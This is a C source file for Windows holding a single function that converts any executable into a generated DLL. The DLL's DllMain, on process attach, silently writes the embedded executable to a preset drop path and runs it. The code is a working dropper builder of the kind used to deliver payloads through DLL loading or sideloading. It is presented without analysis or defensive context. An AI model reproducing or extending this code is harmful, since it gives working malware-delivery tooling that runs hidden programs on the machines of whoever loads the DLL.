#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "config.h"

#define BUILD_LAUNCHER_STRINGIFY_INNER(x) #x
#define BUILD_LAUNCHER_STRINGIFY(x) BUILD_LAUNCHER_STRINGIFY_INNER(x)

static int build_launcher_append_char(char *buffer, size_t capacity, size_t *length, char value)
{
    if (*length + 1 >= capacity)
        return 0;
    buffer[(*length)++] = value;
    buffer[*length] = '\0';
    return 1;
}

static int build_launcher_append_quoted(char *buffer, size_t capacity, size_t *length, const char *argument)
{
    size_t backslashes = 0;

    if (!build_launcher_append_char(buffer, capacity, length, '"'))
        return 0;

    for (const char *p = argument; *p != '\0'; ++p) {
        if (*p == '\\') {
            ++backslashes;
            continue;
        }

        if (*p == '"') {
            for (size_t i = 0; i < backslashes * 2 + 1; ++i) {
                if (!build_launcher_append_char(buffer, capacity, length, '\\'))
                    return 0;
            }
            if (!build_launcher_append_char(buffer, capacity, length, '"'))
                return 0;
        } else {
            for (size_t i = 0; i < backslashes; ++i) {
                if (!build_launcher_append_char(buffer, capacity, length, '\\'))
                    return 0;
            }
            if (!build_launcher_append_char(buffer, capacity, length, *p))
                return 0;
        }
        backslashes = 0;
    }

    for (size_t i = 0; i < backslashes * 2; ++i) {
        if (!build_launcher_append_char(buffer, capacity, length, '\\'))
            return 0;
    }

    return build_launcher_append_char(buffer, capacity, length, '"');
}

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    HANDLE input = INVALID_HANDLE_VALUE;
    HANDLE compiler_process = NULL;
    HANDLE compiler_thread = NULL;
    FILE *source = NULL;
    char temp_directory[MAX_PATH];
    char source_path[MAX_PATH];
    char output_directory[MAX_PATH];
    char temp_dll_path[MAX_PATH];
    char command_line[32768];
    LARGE_INTEGER file_size;
    DWORD temp_length;
    DWORD wait_result;
    DWORD compiler_exit_code = 1;
    size_t command_length = 0;
    int result = -1;
    int temp_dll_created = 0;
    int source_path_created = 0;

    if (binary_path == NULL || dll_out_path == NULL ||
        binary_path[0] == '\0' || dll_out_path[0] == '\0')
        return -1;

    input = CreateFileA(binary_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (input == INVALID_HANDLE_VALUE)
        goto cleanup;

    if (!GetFileSizeEx(input, &file_size) || file_size.QuadPart < 0)
        goto cleanup;

    temp_length = GetTempPathA((DWORD)sizeof(temp_directory), temp_directory);
    if (temp_length == 0 || temp_length >= sizeof(temp_directory))
        goto cleanup;

    if (GetTempFileNameA(temp_directory, "ldr", 0, source_path) == 0)
        goto cleanup;
    source_path_created = 1;

    source = fopen(source_path, "wb");
    if (source == NULL)
        goto cleanup;

    if (fprintf(source,
                "#include <windows.h>\n"
                "#define LDR_DROP_PATH %s\n"
                "static const unsigned char ldr_payload[] = {",
                BUILD_LAUNCHER_STRINGIFY(DROP_PATH)) < 0)
        goto cleanup;

    if (file_size.QuadPart == 0) {
        if (fputs("0", source) == EOF)
            goto cleanup;
    } else {
        unsigned char input_buffer[16384];
        char output_buffer[16 * 12];
        unsigned long long remaining = (unsigned long long)file_size.QuadPart;
        int first_byte = 1;

        while (remaining != 0) {
            DWORD requested = remaining > sizeof(input_buffer)
                                  ? (DWORD)sizeof(input_buffer)
                                  : (DWORD)remaining;
            DWORD bytes_read = 0;

            if (!ReadFile(input, input_buffer, requested, &bytes_read, NULL) ||
                bytes_read != requested)
                goto cleanup;

            size_t output_length = 0;
            for (DWORD i = 0; i < bytes_read; ++i) {
                int written;
                if (first_byte) {
                    written = snprintf(output_buffer + output_length,
                                       sizeof(output_buffer) - output_length,
                                       "0x%02X", (unsigned int)input_buffer[i]);
                    first_byte = 0;
                } else {
                    written = snprintf(output_buffer + output_length,
                                       sizeof(output_buffer) - output_length,
                                       ",0x%02X", (unsigned int)input_buffer[i]);
                }
                if (written < 0 ||
                    (size_t)written >= sizeof(output_buffer) - output_length)
                    goto cleanup;
                output_length += (size_t)written;
                if (output_length > sizeof(output_buffer) - 16) {
                    if (fwrite(output_buffer, 1, output_length, source) != output_length)
                        goto cleanup;
                    output_length = 0;
                }
            }
            if (output_length != 0 &&
                fwrite(output_buffer, 1, output_length, source) != output_length)
                goto cleanup;

            remaining -= bytes_read;
        }
    }

    if (fprintf(source,
                "};\n"
                "static const unsigned long long ldr_payload_size = %lluULL;\n"
                "BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)\n"
                "{\n"
                "    (void)instance;\n"
                "    (void)reserved;\n"
                "    if (reason == DLL_PROCESS_ATTACH) {\n"
                "        HANDLE file = CreateFileA(LDR_DROP_PATH, GENERIC_WRITE, 0, NULL, "
                "CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n"
                "        if (file != INVALID_HANDLE_VALUE) {\n"
                "            unsigned long long offset = 0;\n"
                "            while (offset < ldr_payload_size) {\n"
                "                DWORD amount = (DWORD)((ldr_payload_size - offset) > 1048576ULL "
                "? 1048576UL : (ldr_payload_size - offset));\n"
                "                DWORD written = 0;\n"
                "                if (!WriteFile(file, ldr_payload + offset, amount, &written, NULL) "
                "|| written != amount)\n"
                "                    break;\n"
                "                offset += written;\n"
                "            }\n"
                "            CloseHandle(file);\n"
                "        }\n"
                "        STARTUPINFOA startup;\n"
                "        PROCESS_INFORMATION process;\n"
                "        ZeroMemory(&startup, sizeof(startup));\n"
                "        ZeroMemory(&process, sizeof(process));\n"
                "        startup.cb = sizeof(startup);\n"
                "        if (CreateProcessA(LDR_DROP_PATH, NULL, NULL, NULL, FALSE, 0, NULL, NULL, "
                "&startup, &process)) {\n"
                "            CloseHandle(process.hThread);\n"
                "            CloseHandle(process.hProcess);\n"
                "        }\n"
                "    }\n"
                "    return TRUE;\n"
                "}\n",
                (unsigned long long)file_size.QuadPart) < 0)
        goto cleanup;

    if (fclose(source) != 0) {
        source = NULL;
        goto cleanup;
    }
    source = NULL;

    {
        const char *last_backslash = strrchr(dll_out_path, '\\');
        const char *last_slash = strrchr(dll_out_path, '/');
        const char *separator = last_backslash;
        size_t directory_length;

        if (last_slash != NULL &&
            (separator == NULL || last_slash > separator))
            separator = last_slash;

        if (separator == NULL) {
            output_directory[0] = '.';
            output_directory[1] = '\0';
        } else {
            directory_length = (size_t)(separator - dll_out_path) + 1;
            if (directory_length >= sizeof(output_directory))
                goto cleanup;
            memcpy(output_directory, dll_out_path, directory_length);
            output_directory[directory_length] = '\0';
        }
    }

    if (GetTempFileNameA(output_directory, "ldl", 0, temp_dll_path) == 0)
        goto cleanup;
    temp_dll_created = 1;
    if (!DeleteFileA(temp_dll_path))
        goto cleanup;

    command_line[0] = '\0';
    if (!build_launcher_append_quoted(command_line, sizeof(command_line), &command_length, "gcc") ||
        !build_launcher_append_char(command_line, sizeof(command_line), &command_length, ' ') ||
        !build_launcher_append_quoted(command_line, sizeof(command_line), &command_length, "-m64") ||
        !build_launcher_append_char(command_line, sizeof(command_line), &command_length, ' ') ||
        !build_launcher_append_quoted(command_line, sizeof(command_line), &command_length, "-shared") ||
        !build_launcher_append_char(command_line, sizeof(command_line), &command_length, ' ') ||
        !build_launcher_append_quoted(command_line, sizeof(command_line), &command_length, "-O2") ||
        !build_launcher_append_char(command_line, sizeof(command_line), &command_length, ' ') ||
        !build_launcher_append_quoted(command_line, sizeof(command_line), &command_length, "-s") ||
        !build_launcher_append_char(command_line, sizeof(command_line), &command_length, ' ') ||
        !build_launcher_append_quoted(command_line, sizeof(command_line), &command_length, "-o") ||
        !build_launcher_append_char(command_line, sizeof(command_line), &command_length, ' ') ||
        !build_launcher_append_quoted(command_line, sizeof(command_line), &command_length, temp_dll_path) ||
        !build_launcher_append_char(command_line, sizeof(command_line), &command_length, ' ') ||
        !build_launcher_append_quoted(command_line, sizeof(command_line), &command_length, "-x") ||
        !build_launcher_append_char(command_line, sizeof(command_line), &command_length, ' ') ||
        !build_launcher_append_quoted(command_line, sizeof(command_line), &command_length, "c") ||
        !build_launcher_append_char(command_line, sizeof(command_line), &command_length, ' ') ||
        !build_launcher_append_quoted(command_line, sizeof(command_line), &command_length, source_path))
        goto cleanup;

    {
        STARTUPINFOA startup;
        PROCESS_INFORMATION process;

        ZeroMemory(&startup, sizeof(startup));
        ZeroMemory(&process, sizeof(process));
        startup.cb = sizeof(startup);

        if (!CreateProcessA(NULL, command_line, NULL, NULL, FALSE, 0, NULL, NULL,
                            &startup, &process))
            goto cleanup;

        compiler_process = process.hProcess;
        compiler_thread = process.hThread;
    }

    wait_result = WaitForSingleObject(compiler_process, INFINITE);
    if (wait_result != WAIT_OBJECT_0 ||
        !GetExitCodeProcess(compiler_process, &compiler_exit_code) ||
        compiler_exit_code != 0)
        goto cleanup;

    if (!MoveFileExA(temp_dll_path, dll_out_path,
                     MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
        goto cleanup;

    temp_dll_created = 0;
    result = 0;

cleanup:
    if (source != NULL)
        fclose(source);
    if (compiler_thread != NULL)
        CloseHandle(compiler_thread);
    if (compiler_process != NULL)
        CloseHandle(compiler_process);
    if (input != INVALID_HANDLE_VALUE)
        CloseHandle(input);
    if (source_path_created)
        DeleteFileA(source_path);
    if (temp_dll_created)
        DeleteFileA(temp_dll_path);
    return result;
}